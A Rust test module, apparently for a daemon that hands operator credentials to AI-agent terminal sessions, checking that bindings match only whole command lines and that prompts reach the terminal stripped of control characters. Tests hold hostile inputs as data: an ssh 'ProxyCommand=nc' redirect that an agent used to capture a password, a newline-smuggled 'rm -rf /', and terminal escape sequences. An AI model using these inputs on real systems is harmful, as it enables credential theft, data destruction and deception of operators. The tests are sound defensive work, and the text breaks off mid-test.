    /// Review finding I-2: mutating `\A(?:p)\z` to `\Ap\z` left every
    /// other row in this module green, so a later hand could delete the
    /// group — which reads like tidying — and ship a real regression
    /// against a clean suite.
    ///
    /// The mechanism is precedence. `|` binds looser than concatenation,
    /// so an operator's bare top-level alternation `a|b`, wrapped without
    /// a group, becomes `\Aa|b\z` — *"`a` at the start, **or** `b` at the
    /// end"*. The first branch is a prefix match again, which is GH #45
    /// exactly.
    ///
    /// The pattern here carries **no anchors of its own**, which is what
    /// makes it discriminating: §9.6's published example starts with `^`,
    /// and that `^` would mask the missing group for the first branch.
    #[test]
    fn an_alternation_needs_the_group_or_the_prefix_match_comes_back() {
        let b = plain_binding("two-hosts", "ssh\\s+prod-01|psql\\s+-h\\s+prod");
        let one = std::slice::from_ref(&b);

        // Both branches select the lines they were written for. First, so
        // the negative below is not passing against a matcher that matches
        // nothing.
        assert!(select(one, "ssh prod-01", "").is_some());
        assert!(select(one, "psql -h prod", "").is_some());

        // Without the group this is `\Assh\s+prod-01` — a prefix match —
        // and returns the binding.
        assert_eq!(
            select(one, "ssh prod-01 -o ProxyCommand=nc 127.0.0.1 2222", ""),
            None,
            "the first branch matched as a prefix, so `whole_line` lost its `(?:…)`"
        );
        // The mirror on the second branch, which a missing group leaves
        // *suffix*-matched rather than prefix-matched. One row cannot be
        // green with the group gone.
        assert_eq!(
            select(one, "sudo -u postgres psql -h prod", ""),
            None,
            "the last branch matched as a suffix, so `whole_line` lost its `(?:…)`"
        );
    }

    /// **The anchors have to be end-of-*text*, and an operator's inline
    /// `(?m)` is what tells the two apart.**
    ///
    /// The other half of review finding I-2. This row does not
    /// discriminate `\A(?:p)\z` from `^(?:p)$` — nothing can, because in
    /// `regex` 1.13.1 those are the same thing, which
    /// `config::tests::this_crates_dollar_is_end_of_text_not_end_of_line`
    /// pins. What it does discriminate is the fully-degraded
    /// `^{pattern}$`, where the operator's `(?m)` escapes into the
    /// wrapper's own anchors and turns them into line anchors: the wrapper
    /// then accepts `ssh prod-01\nrm -rf /`, matching the operator's line
    /// and leaving the agent a second line to do as it likes with.
    ///
    /// A binding that legitimately carries `(?m)` is odd but legal, and an
    /// argument containing a newline needs no privilege at all.
    #[test]
    fn an_operators_inline_multiline_flag_cannot_reach_the_wrappers_anchors() {
        let b = plain_binding("prod-ssh", "(?m)^ssh\\s+prod-01$");
        let one = std::slice::from_ref(&b);

        // The line the operator wrote it for.
        assert!(select(one, "ssh prod-01", "").is_some());

        // The operator's own text, on its own line, with the agent's
        // payload on the next one.
        assert_eq!(
            select(one, "ssh prod-01\nrm -rf /", ""),
            None,
            "an inline `(?m)` reached the wrapper's anchors, so a newline in an \
             argument buys back everything after it"
        );
        // And the same shape the other way up, so the row is not about
        // which side of the newline the payload sits on.
        assert_eq!(select(one, "evil\nssh prod-01", ""), None);
    }

    /// The two patterns the whole-line rule turns from live holes into
    /// nothing, driven.
    ///
    /// **This row asserted the opposite until GH #45** — it was
    /// `an_empty_match_command_matches_every_session`, and it existed to
    /// write down two hazards this module could then only warn about. Both
    /// are now closed by the same line, so the row is kept and inverted
    /// rather than deleted: the cases are still the ones worth stating,
    /// and a reader who greps for the old name should find where it went.
    ///
    /// 1. **`match_command = ""`.** The empty regex now matches only the
    ///    empty subject — which a session's command line never is,
    ///    because it always has a command in it. An earlier revision
    ///    added that it was "still config-legal" and that "rejecting it
    ///    at load is therefore no longer load-bearing and is not done";
    ///    both stopped being true in round 3, which made `match_example`
    ///    required and judges `match_command` against it. It **is**
    ///    rejected at load, driven by
    ///    [`every_fixture_pattern_is_one_an_operator_could_actually_load`].
    ///    This row is about the other half — that even reached from Rust,
    ///    where the loader cannot intervene, it selects nothing real.
    /// 2. **The word-boundary straddle.** An unanchored operator pattern
    ///    used to be satisfiable by an agent that never ran the command at
    ///    all, from a space inside one argument.
    #[test]
    fn neither_an_empty_nor_a_partial_match_command_selects_a_real_session() {
        let everything = plain_binding("open", "");
        for line in [
            "ssh prod-01",
            "psql -h staging",
            "bash",
            "some-utterly-unrelated-command --flag",
        ] {
            assert_eq!(
                select(std::slice::from_ref(&everything), line, ""),
                None,
                "an empty match_command is still read literally, and the empty regex \
                 does not cover {line:?} end to end"
            );
        }
        // Read **literally**, not special-cased: the one subject the empty
        // regex does cover is the empty one. Without this line the row
        // above is equally true of a matcher that special-cases `""` to
        // `false`, which would be a second place an operator's pattern
        // means something other than what a regex engine says it means.
        assert!(select(std::slice::from_ref(&everything), "", "").is_some());

        // The pairing: a non-empty pattern still selects, so the rows above
        // are not satisfied by a `select` that answers `None` always.
        let narrow = plain_binding("narrow", SSH_PROD);
        assert!(select(std::slice::from_ref(&narrow), "ssh prod-01", "").is_some());
        assert!(select(std::slice::from_ref(&narrow), "psql -h staging", "").is_none());

        // The straddle. The operator's pattern reaches neither end of the
        // line the agent built, so it no longer matches — and the agent
        // here never runs `ssh` at all.
        let partial = plain_binding("partial", "ssh\\s+prod-01");
        let agent_line = command_line("cat", &["x".to_string(), "ssh prod-01 y".to_string()]);
        assert_eq!(agent_line, "cat x ssh prod-01 y");
        assert_eq!(
            select(std::slice::from_ref(&partial), &agent_line, ""),
            None,
            "an argument straddled a word boundary and reached the operator's binding"
        );
        // And the pairing for *that*: the same partial pattern still
        // selects the line it does cover whole, so the assertion above is
        // about where the pattern reaches and not about the pattern being
        // rejected outright.
        assert!(select(std::slice::from_ref(&partial), "ssh prod-01", "").is_some());
    }

    /// A pattern that cannot compile is not a match, and does not panic.
    ///
    /// `Config::validate` rejects both patterns at load, so this is
    /// unreachable from a config file; a `SecurityConfig` built in Rust
    /// can reach it, and the two wrong answers — panic, or treat it as a
    /// match — are a dead daemon and a binding that fires on everything.
    #[test]
    fn an_uncompilable_pattern_matches_nothing() {
        let mut bad = plain_binding("bad", "^ssh(");
        assert_eq!(select(std::slice::from_ref(&bad), "ssh prod-01", "x"), None);
        bad.match_command = SSH_PROD.into();
        bad.match_prompt = "(?P<".into();
        assert_eq!(select(std::slice::from_ref(&bad), "ssh prod-01", "x"), None);
        // The pairing, or the row above passes against a `select` that
        // always answers `None`.
        bad.match_prompt = "x".into();
        assert!(select(std::slice::from_ref(&bad), "ssh prod-01", "x").is_some());
    }

    /// **The fixture corpus, driven through the real loader (GH #45
    /// M-7).**
    ///
    /// Every row in this module builds its `SecurityConfig` in Rust, so
    /// until now no fixture pattern had ever been seen by
    /// `Config::validate` — the check that, since round 3, is what stops
    /// an operator writing a `match_command` admitting more than the
    /// session it names. The gap that leaves is not hypothetical: a
    /// corpus of patterns the daemon would refuse to start on is a corpus
    /// proving things about a configuration nobody can deploy.
    ///
    /// Closed in both directions. Every pattern in
    /// [`LOADABLE_FIXTURE_PATTERNS`] goes into a real document with the
    /// example that justifies it and must **load**; every pattern in
    /// [`REFUSED_FIXTURE_PATTERNS`] must be **refused**, which is what
    /// makes those rows' subject a real property rather than an assumed
    /// one. [`plain_binding`] asserts membership, so a pattern in neither
    /// list cannot slip past this row — it fails at the row that
    /// introduced it, naming both lists.
    ///
    /// **`match_command = ""` is refused at load**, and two sentences in
    /// this file said the opposite until round 4: that it was *"still
    /// config-legal"* and that *"rejecting it at load is therefore no
    /// longer load-bearing and is not done"*. Driven here — it is
    /// rejected, because it cannot match its own required
    /// `match_example`. The empty pattern reaches `matches` only where
    /// this module puts it, from Rust.
    #[test]
    fn every_fixture_pattern_is_one_an_operator_could_actually_load() {
        for (pattern, example) in LOADABLE_FIXTURE_PATTERNS {
            assert_fixture_pattern_loads(pattern, example);
        }
        // **The pairing**, or the loop above is satisfied by an
        // `assert_fixture_pattern_loads` that accepts everything — which
        // is the shape this row is written against, since the corpus it
        // guards is a corpus of things that *should* load.
        for (pattern, row) in REFUSED_FIXTURE_PATTERNS {
            let mut cfg =
                crate::config::parse_str("").expect("the empty document is the shipped default");
            cfg.security.secret_provider = "keychain".to_string();
            cfg.security.secret_bindings = vec![SecretBinding {
                match_command: (*pattern).to_string(),
                match_example: "ssh prod-01".to_string(),
                ..plain_binding("corpus", SSH_PROD)
            }];
            let e = cfg
                .validate()
                .expect_err(&format!(
                    "{pattern:?} now loads, so `{row}` is no longer a row about a pattern \
                     the loader refuses — move it to `LOADABLE_FIXTURE_PATTERNS`"
                ))
                .to_string();
            assert!(
                e.contains("match_command"),
                "the refusal must name the key an operator has to fix: {e}"
            );
        }
    }

    // ------------------------------------------- §5.2 step 1, end to end

    /// **The positive control for the whole group.** A session the binding
    /// names resolves from the provider, and the child receives the value.
    ///
    /// The session's recorded command line is `ssh user@prod-01` and the
    /// binding is §9.6's own example pattern. Without this row every
    /// negative below is satisfied by a matcher that never matches.
    #[tokio::test]
    async fn a_binding_matches_the_sessions_own_command_line() {
        let mut sc = Scratch::new("match");
        let b = sc.binding(
            "prod-ssh",
            "^ssh\\s+(\\S+@)?prod-0[12]\\b",
            &format!("printf '{PROBE}\\n'\n"),
        );
        let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
        let s = session_running("ssh", &["user@prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;

        let payload = call(&server, secret_args(&s.id, 10)).await;

        assert_eq!(payload["status"], "secret_provided", "{payload}");
        assert_eq!(
            payload["data"]["bytes_written"],
            (PROBE.len() + 1) as u64,
            "seven bytes plus the appended newline"
        );
        assert!(sc.ran("prod-ssh"), "the binding's provider never ran");

        // The child transformed what it read — the arrival proof, and the
        // reason the absence assertions beside it mean anything.
        let seen = buffer_until(&s, b"got=HUNTER2", 20).await;
        assert!(
            !contains(&seen, PROBE.as_bytes()),
            "the resolved value reached the ring buffer: {}",
            String::from_utf8_lossy(&seen)
        );
        assert!(
            !payload.to_string().contains(PROBE),
            "the resolved value reached the MCP response: {payload}"
        );
        // No human was asked: §5.2's step 1 answered, so step 2 never ran.
        let kinds = sc.kinds(&s.id);
        assert_eq!(
            kinds,
            vec!["binding_resolved".to_string()],
            "the keychain step resolved and the prompt path must not also have run"
        );

        let _ = s.signal(Signal::Kill);
    }

    /// **The pairing.** A session the binding does not name resolves
    /// nothing, spawns nothing, and falls through to the prompt path.
    ///
    /// Without it, a matcher that matches *everything* passes the row
    /// above perfectly — and is a credential store handed to every session
    /// on the box.
    #[tokio::test]
    async fn a_session_the_binding_does_not_name_resolves_nothing() {
        let mut sc = Scratch::new("nomatch");
        let b = sc.binding(
            "prod-ssh",
            "^ssh\\s+(\\S+@)?prod-0[12]\\b",
            &format!("printf '{PROBE}\\n'\n"),
        );
        let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
        let s = session_running("ssh", &["user@staging"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;

        let payload = call(&server, secret_args(&s.id, 1)).await;

        assert!(
            !sc.ran("prod-ssh"),
            "a provider process was spawned for a session no binding names"
        );
        fell_through_to_the_prompt(&payload, &sc, &s.id);
        assert!(
            !contains(&buffered(&s), b"got="),
            "the child received something on a row where nothing should have been \
             written to it"
        );

        let _ = s.signal(Signal::Kill);
    }

    /// **GH #45, end to end.** The issue's reproduction, driven through
    /// the same tool call the agent used against a real daemon.
    ///
    /// `an_agent_cannot_append_arguments_to_reach_an_operators_binding`
    /// is the unit half and would stay green against a daemon that never
    /// consulted the matcher at all. This one runs `request_secret_input`
    /// on a **live PTY** with §9.6's published pattern and the issue's
    /// argv, and asserts the three things the issue observed going the
    /// other way: no provider process, no `binding_resolved`, and a call
    /// that fell through to the human prompt.
    ///
    /// Its pairing is `a_binding_matches_the_sessions_own_command_line`,
    /// two rows up — the same binding, the same provider script, and a
    /// session the operator meant, which resolves.
    #[tokio::test]
    async fn an_appended_proxy_command_reaches_no_provider() {
        let mut sc = Scratch::new("gh45");
        let b = sc.binding(
            "prod-ssh",
            "^ssh\\s+(\\S+@)?prod-0[12]\\b",
            &format!("printf '{PROBE}\\n'\n"),
        );
        let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
        // The issue's `start_session` call, verbatim. The child is the
        // echo-off fixture rather than a real `ssh` (no test may run one),
        // which is exactly the arrangement every other row here uses: §9.4
        // records what `start_session` was called with, and that recorded
        // line is what `match_command` sees.
        let s = session_running(
            "ssh",
            &[
                "prod-01",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-o",
                "ProxyCommand=nc 127.0.0.1 2222",
            ],
            ECHO_OFF_FIXTURE,
        );
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;

        let payload = call(&server, secret_args(&s.id, 1)).await;

        assert!(
            !sc.ran("prod-ssh"),
            "the operator's provider ran for a command line the agent shaped to \
             redirect the client's transport at itself"
        );
        fell_through_to_the_prompt(&payload, &sc, &s.id);
        // The issue's own observation, inverted: `read_output` returned
        // the prompt *and the value*. Nothing was written, so the child
        // never transformed anything.
        let seen = buffered(&s);
        assert!(
            !contains(&seen, b"got="),
            "the child was given something: {}",
            String::from_utf8_lossy(&seen)
        );
        assert!(
            !contains(&seen, PROBE.as_bytes()),
            "the operator's credential reached the ring buffer, which is where the \
             issue read it back out of"
        );

        let _ = s.signal(Signal::Kill);
    }

    /// **REQ-SEC-012, adversarial.** The agent names a secret in
    /// `prompt_text` and it reaches no lookup.
    ///
    /// Two spellings, because an implementation that read `prompt_text`
    /// would most plausibly read it as *a reference* — and the two
    /// reference shapes §9.6 publishes are 1Password's URI and
    /// `secret-service`'s attribute list. Both are passed, on a session
    /// with **no** matching binding, and neither may produce a lookup.
    ///
    /// §9.6: *"There is no 'agent asks for a named secret' API at all."*
    #[tokio::test]
    async fn no_agent_argument_reaches_a_provider_lookup() {
        for agent_string in [
            "op://vault/prod-db/password",
            "service=holdfast,account=prod-ssh",
        ] {
            let mut sc = Scratch::new("reqsec012");
            let b = sc.binding(
                "prod-ssh",
                "^ssh\\s+(\\S+@)?prod-0[12]\\b",
                &format!("printf '{PROBE}\\n'\n"),
            );
            let server = server_with(keychain_mode(vec![b]), &sc.audit_log());
            // A session the binding does **not** name, so the only way to
            // a provider is through the agent's own string.
            let s = session_running("psql", &["-h", "prod-db"], ECHO_OFF_FIXTURE);
            server.registry.insert(Arc::clone(&s)).expect("register");
            await_prompt(&s, b"Password: ").await;

            let payload = call(
                &server,
                RequestSecretInputArgs {
                    prompt_text: agent_string.to_string(),
                    ..secret_args(&s.id, 1)
                },
            )
            .await;

            assert!(
                !sc.ran("prod-ssh"),
                "a provider ran for the agent-supplied string {agent_string:?}: \
                 `prompt_text` reached a binding lookup"
            );
            fell_through_to_the_prompt(&payload, &sc, &s.id);

            let _ = s.signal(Signal::Kill);
        }
    }

    /// `match_prompt` is applied to the **unredacted** line.
    ///
    /// The child's prompt carries a GitHub token, which the redactor turns
    /// into `[REDACTED:github]` on every surface that emits it. A matcher
    /// reading the redacted string would find no `ghp_` and the operator's
    /// binding would silently stop working — a redactor switching off a
    /// security control.
    ///
    /// **Two pairings.** The same session's redacted line *is* redacted,
    /// so the unredacted string did not escape by being unredacted
    /// everywhere; and the row waits for a **non-empty** prompt line before
    /// it calls, so it cannot be satisfied by a matcher that ran against
    /// nothing (REQ-O-013).
    #[tokio::test]
    async fn match_prompt_is_matched_against_the_unredacted_line() {
        const TOKEN: &str = "ghp_0123456789abcdefghijABCDEFGHIJ012345";
        let prompt = format!("password for {TOKEN}: ");

        let mut sc = Scratch::new("unredacted");
        let mut b = sc.binding("gh", "^git\\s+push$", &format!("printf '{PROBE}\\n'\n"));
        b.match_prompt = "(?i)password for ghp_".to_string();
        let server = server_with(keychain_mode(vec![b]), &sc.audit_log());

        let s = session_running("git", &["push"], &echo_off_prompting(&prompt));
        server.registry.insert(Arc::clone(&s)).expect("register");
        // REQ-O-013's pairing, **before** the call: a non-empty line, so a
        // matcher that never ran against anything cannot satisfy the row.
        let line = await_detected_prompt(&s, TOKEN).await;
        assert!(
            line.contains(TOKEN),
            "the detector's line is not the unredacted prompt: {line:?}"
        );
        // And the redacted rendering, which is what every surface emits.
        let redacted = s.prompt_last_line_redacted();
        assert!(
            redacted.contains("[REDACTED:github]") && !redacted.contains(TOKEN),
            "the token is not redacted on the surfaces that emit it, so this row is \
             not about redaction at all: {redacted:?}"
        );

        let payload = call(&server, secret_args(&s.id, 10)).await;

        assert_eq!(payload["status"], "secret_provided", "{payload}");
        assert!(
            sc.ran("gh"),
            "the binding did not fire: `match_prompt` was applied to the redacted line, \
             where `{TOKEN}` reads `[REDACTED:github]`"
        );
        buffer_until(&s, b"got=HUNTER2", 20).await;

        let _ = s.signal(Signal::Kill);
    }

    /// **`AwaitingSecret.prompt_text` reaches the worst surface in the
    /// tree, and the agent writes it.**
    ///
    /// GH #45 J-3. `holdfast attach` hands that field to `render`, which
    /// is documented as *"write bytes to the local terminal,
    /// unmodified"* — so an escape sequence in it is not displayed
    /// oddly, it is **executed** by the operator's terminal. The string
    /// is `request_secret_input`'s own `prompt_text` argument.
    ///
    /// **The session deliberately does not drop echo.** A child that had
    /// would raise its own request first and this call would *adopt* it,
    /// carrying the child's line instead — which is what the approval row
    /// two hundred lines down ends up asserting, and it is not this.
    ///
    /// **The child-derived half of the same field has its own row**, and
    /// it is [`a_childs_prompt_line_reaches_the_terminal_with_nothing_that_can_act`].
    /// An earlier revision of this paragraph said that half needed none,
    /// because `detection().last_line` was "already free of control
    /// characters". That was a measurement of one subject —
    /// `WRONG\x08\x08\x08\x08\x08\rPassword: ` does reach the detector as
    /// exactly `Password: ` — generalised into a claim about control
    /// characters at large, which is false: `detect::scanner`'s `ground`
    /// drops only `0x00..=0x1f | 0x7f`, so all 32 C1 controls survive as
    /// UTF-8 and land in the line. The strip on that path is load-bearing
    /// and the sibling row is what says so.
    #[tokio::test]
    async fn an_agents_prompt_text_reaches_the_terminal_with_nothing_that_can_act() {
        let hostile = "\u{1b}]0;forged\u{7}\u{1b}[2Kpassword for prod-01:\rall clear";

        let sc = Scratch::new("promptstrip");
        let server = server_with(keychain_mode(vec![]), &sc.audit_log());
        let s = session_running("ssh", &["prod-01"], "sleep 30");
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);

        let payload = call(
            &server,
            RequestSecretInputArgs {
                prompt_text: hostile.to_string(),
                ..secret_args(&s.id, 1)
            },
        )
        .await;
        assert_eq!(payload["status"], "secret_cancelled", "{payload}");

        let frame = client.wait_for("AwaitingSecret", is_awaiting).await;
        let ServerFrame::AwaitingSecret { prompt_text, .. } = frame else {
            unreachable!()
        };
        assert!(
            !prompt_text.chars().any(char::is_control),
            "the agent's `prompt_text` reached every attached client with a control \
             character in it, and `holdfast attach` writes it to the terminal \
             unmodified: {prompt_text:?}"
        );
        // De-fanged, not deleted. A field that dropped the OSC payload
        // would pass the assertion above while showing the operator a
        // shorter, more innocent prompt than the agent actually sent —
        // which is the forged-short-line failure in its other spelling.
        assert!(
            prompt_text.contains("forged") && prompt_text.ends_with("all clear"),
            "the agent's prompt was consumed rather than de-fanged: {prompt_text:?}"
        );

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
    }

    /// **The child-derived half of the same field, and the strip a
    /// previous round called decorative.**
    ///
    /// GH #45 K-1, and the sibling of
    /// [`an_agents_prompt_text_reaches_the_terminal_with_nothing_that_can_act`].
    /// That row pins the half the *agent* supplies. This one pins the
    /// half the **child** supplies, which reaches the same field by a
    /// different route and is stripped by a different call: the reader
    /// classifies `AwaitingSecret`, sends `SessionEvent::
    /// AwaitingSecretEntered` carrying `redact_for_display(rules,
    /// &snap.last_line)`, and `attach::conn`'s `forward_events` turns
    /// that into the frame `holdfast attach` hands to `render` —
    /// `write_all` plus `flush`, no filtering anywhere after this point.
    ///
    /// **What was believed, and the shape of the mistake.** Round 2
    /// recorded that `detection().last_line` is *"already free of control
    /// characters"* and that the strip is *"not load-bearing"*, and
    /// reported it as measured. The measurement was real: `WRONG\x08…\r
    /// Password: ` does reach the detector as exactly `Password: `,
    /// because `\x08` and `\r` are handled by name in `detect::scanner`'s
    /// `ground`. What was not measured was the generalisation from those
    /// two bytes to control characters at large — and it is false.
    /// `ground` drops `0x00..=0x1f | 0x7f` and routes `0x1b` into the
    /// escape machine; **every byte `>= 0x80` falls to `text()`**, and
    /// `TailLine::as_string`'s `from_utf8_lossy` reassembles `\xc2\x9b`
    /// as U+009B. So all 32 C1 controls arrive here, as do U+202E and
    /// U+200B. Nor is there a strip in the reader to fall back on:
    /// `detector_guard.feed(&buf[..n], …)` is given the raw chunk.
    ///
    /// **Anti-vacuous by construction.** The row asserts the *raw*
    /// `detection().last_line` still carries all three characters before
    /// asserting the rendered forms do not. Without that, a future
    /// scanner change that started dropping C1 would leave this row green
    /// while it tested nothing — which is precisely the state the
    /// corrected comments describe, and the reason this row exists.
    ///
    /// **Both rendered callers, because they are two calls.**
    /// `prompt_last_line_redacted` (the replay path) is asserted from the
    /// line the detector has *after* the whole prompt has landed, so it
    /// is exact and free of any chunk-boundary question. The frame is
    /// asserted as it was emitted at the edge.
    ///
    /// Delete either strip — swap `redact_for_display` for `redact_str`
    /// at either site — and this row fails. The sibling above does not,
    /// because `mcp::tools` strips the agent's argument separately.
    ///
    /// U+009B is 8-bit CSI, and whether a given emulator *acts* on a
    /// UTF-8-encoded C1 varies by emulator. So the claim asserted here is
    /// the one that does not depend on that: this field is documented as
    /// one line of plain text a human reads to make a decision, and a
    /// control character in it is outside what that promises.
    #[tokio::test]
    async fn a_childs_prompt_line_reaches_the_terminal_with_nothing_that_can_act() {
        // 8-bit CSI as the child's own bytes — `\xc2\x9b` on the wire —
        // with the `2K` erase-line parameter an emulator honouring C1
        // would consume, plus the two the round-2 probe also found
        // surviving. Chosen so the visible residue is unambiguous:
        // everything hostile is dropped and `Password2K: ` is what is
        // left.
        let prompt = "Password\u{9b}2K\u{202e}\u{200b}: ";
        let shown_expected = "Password2K: ";

        let sc = Scratch::new("childpromptstrip");
        let server = server_with(keychain_mode(vec![]), &sc.audit_log());
        let s = session_running("ssh", &["prod-01"], &echo_off_prompting(prompt));
        server.registry.insert(Arc::clone(&s)).expect("register");
        let mut client = attach_fake(&server, &s.id);
        let forwarder = spawn_forwarder(&server, &s, None);

        // Anti-vacuity first, and it waits for the **whole** prompt, so
        // the three assertions below cannot be satisfied by a prefix.
        let raw = await_detected_prompt(&s, prompt).await;
        assert!(
            raw.contains('\u{9b}'),
            "the scanner no longer delivers C1 to `last_line`; this row is now vacuous \
             and the comments it pins need re-deriving: {raw:?}"
        );
        assert!(
            raw.contains('\u{202e}') && raw.contains('\u{200b}'),
            "the scanner no longer delivers U+202E/U+200B to `last_line`: {raw:?}"
        );

        // Caller one: the replay path, read after the line is complete.
        assert_eq!(
            s.prompt_last_line_redacted(),
            shown_expected,
            "`prompt_last_line_redacted` handed a human the child's control characters"
        );

        // Caller two: the frame, as it was emitted at the edge.
        let frame = client.wait_for("AwaitingSecret", is_awaiting).await;
        let ServerFrame::AwaitingSecret { prompt_text, .. } = frame else {
            unreachable!()
        };
        assert!(
            !prompt_text.chars().any(char::is_control),
            "the child's prompt line reached every attached client with a control \
             character in it, and `holdfast attach` writes that field to the terminal \
             unmodified: {prompt_text:?}"
        );
        assert_eq!(
            prompt_text, shown_expected,
            "the child's prompt was consumed or altered rather than de-fanged"
        );

        client.unregister(&server);
        let _ = s.signal(Signal::Kill);
        let _ = forwarder.await;
    }

    /// §9.6: bindings are *"probed in configured order"*, and the first
    /// match wins.
    ///
    /// The two names are `zeta` and `alpha`, in that configured order, so
    /// an implementation that collected them into a `BTreeMap` or any
    /// other name-ordered structure resolves the **wrong** one here
    /// deterministically rather than half the time.
    #[tokio::test]
    async fn the_first_matching_binding_in_order_wins() {
        let mut sc = Scratch::new("order");
        let mut first = sc.binding("zeta", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        first.provider = "pass".into();
        let mut second = sc.binding("alpha", SSH_PROD, "printf 'wrong-one\\n'\n");
        second.provider = "onepassword".into();
        let server = server_with(keychain_mode(vec![first, second]), &sc.audit_log());

        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;

        let payload = call(&server, secret_args(&s.id, 10)).await;

        assert_eq!(payload["status"], "secret_provided", "{payload}");
        assert!(sc.ran("zeta"), "the first configured binding did not run");
        assert!(
            !sc.ran("alpha"),
            "the second configured binding also ran: both were probed rather than the \
             first winning"
        );
        // And the trail names the first, not the second.
        let entries = sc.audit(&s.id);
        let resolved = entries
            .iter()
            .find(|e| e["kind"] == "binding_resolved")
            .expect("a binding_resolved entry");
        assert_eq!(resolved["binding_name"], sc.name("zeta"));
        assert_eq!(resolved["provider"], "pass");
        // The child got `zeta`'s value and not `alpha`'s.
        let seen = buffer_until(&s, b"got=HUNTER2", 20).await;
        assert!(
            !contains(&seen, b"WRONG-ONE"),
            "the child received the second binding's value: {}",
            String::from_utf8_lossy(&seen)
        );

        let _ = s.signal(Signal::Kill);
    }

    /// §9.6's `max_uses`, which is **per session**.
    ///
    /// `max_uses = 2`: the third resolution in one session falls through
    /// to the human path, while a **second** session matching the same
    /// binding still gets its first. The second half is what separates a
    /// per-session budget from a global counter — a global one starves
    /// every other session on the box — and the first is what separates it
    /// from no counter at all, which passes any single-session test.
    #[tokio::test]
    async fn max_uses_is_per_session_and_bounded() {
        let mut sc = Scratch::new("maxuses");
        let mut b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        b.max_uses = Some(2);
        let server = server_with(keychain_mode(vec![b]), &sc.audit_log());

        // A child that answers three echo-off reads in a row, so the row
        // does not need three sessions to make three requests.
        let three = format!("{ECHO_OFF_FIXTURE}; {ECHO_OFF_FIXTURE}; {ECHO_OFF_FIXTURE}");
        let a = session_running("ssh", &["prod-01"], &three);
        server.registry.insert(Arc::clone(&a)).expect("register");

        for n in 1..=2u32 {
            await_prompt(&a, b"Password: ").await;
            let payload = call(&server, secret_args(&a.id, 10)).await;
            assert_eq!(
                payload["status"], "secret_provided",
                "resolution {n} of 2 was refused: {payload}"
            );
            buffer_until(&a, b"got=HUNTER2", 20).await;
        }
        assert_eq!(a.binding_uses().get(&sc.name("prod-ssh")), Some(&2));

        // The third. The provider is not consulted at all.
        let marker = sc.marker("prod-ssh");
        std::fs::remove_file(&marker).expect("the fixture ran at least once");
        await_prompt(&a, b"Password: ").await;
        let third = call(&server, secret_args(&a.id, 1)).await;
        assert!(
            !sc.ran("prod-ssh"),
            "the third resolution consulted the provider despite max_uses = 2"
        );
        assert_eq!(
            third["status"], "secret_cancelled",
            "the third resolution did not fall through to the human path: {third}"
        );
        assert_eq!(
            a.binding_uses().get(&sc.name("prod-ssh")),
            Some(&2),
            "an exhausted claim still incremented the counter"
        );

        // **The other half: a second session's budget is its own.**
        let b2 = session_running("ssh", &["prod-02"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&b2)).expect("register");
        await_prompt(&b2, b"Password: ").await;
        let fresh = call(&server, secret_args(&b2.id, 10)).await;
        assert_eq!(
            fresh["status"], "secret_provided",
            "a second session matching the same binding was starved by the first \
             session's budget: the counter is global: {fresh}"
        );
        assert!(
            sc.ran("prod-ssh"),
            "the second session's provider never ran"
        );
        assert_eq!(
            b2.binding_uses().get(&sc.name("prod-ssh")),
            Some(&1),
            "the second session's count is not its own"
        );

        let _ = a.signal(Signal::Kill);
        let _ = b2.signal(Signal::Kill);
    }

    /// `None` and `Some(0)` both mean unlimited.
    ///
    /// An omitted knob and an explicitly-zero one must not differ, and
    /// unlimited is the only reading under which omitting `max_uses`
    /// leaves a binding usable at all. §9.6 documents `0 = unlimited` and
    /// says nothing about the omitted case; this is the ruling.
    #[test]
    fn an_absent_and_a_zero_max_uses_are_both_unlimited() {
        let s = session_running("ssh", &["prod-01"], "sleep 30");
        for max in [None, Some(0)] {
            for n in 1..=5u32 {
                assert_eq!(
                    s.claim_binding_use(&format!("b{max:?}"), max),
                    Some(n),
                    "max_uses = {max:?} refused use {n}"
                );
            }
        }
        // The pairing: a real bound still bounds.
        assert_eq!(s.claim_binding_use("bounded", Some(1)), Some(1));
        assert_eq!(s.claim_binding_use("bounded", Some(1)), None);
        let _ = s.signal(Signal::Kill);
    }

    /// **The shipped posture.** With a matching binding and
    /// `secret_provider` left at its default, no provider subprocess is
    /// spawned and the call goes straight to the prompt path.
    ///
    /// This is the difference between a default install that never touches
    /// a credential store and one that touches it on every echo-off
    /// prompt.
    #[tokio::test]
    async fn the_default_provider_mode_never_spawns_a_provider() {
        let mut sc = Scratch::new("defaultmode");
        let b = sc.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
        // Everything about this config is the resolving one **except** the
        // mode, which is left at its default.
        let security = SecurityConfig {
            secret_bindings: vec![b],
            ..SecurityConfig::default()
        };
        assert_eq!(
            security.secret_provider, "prompt",
            "the default changed; this row is about the default"
        );
        let server = server_with(security, &sc.audit_log());

        let s = session_running("ssh", &["prod-01"], ECHO_OFF_FIXTURE);
        server.registry.insert(Arc::clone(&s)).expect("register");
        await_prompt(&s, b"Password: ").await;

        let payload = call(&server, secret_args(&s.id, 1)).await;

        assert!(
            !sc.ran("prod-ssh"),
            "the default mode spawned a provider: a stock install now reads the \
             operator's credential store on every echo-off prompt"
        );
        fell_through_to_the_prompt(&payload, &sc, &s.id);

        // **The pairing**, and the reason the absence above is not
        // vacuous: the identical config with the mode moved to `keychain`
        // *does* resolve. Without it this row passes against a matcher
        // that never matches and a fixture that could never run.
        let mut sc2 = Scratch::new("defaultmode-control");
        let b2 = sc2.binding("prod-ssh", SSH_PROD, &format!("printf '{PROBE}\\n'\n"));
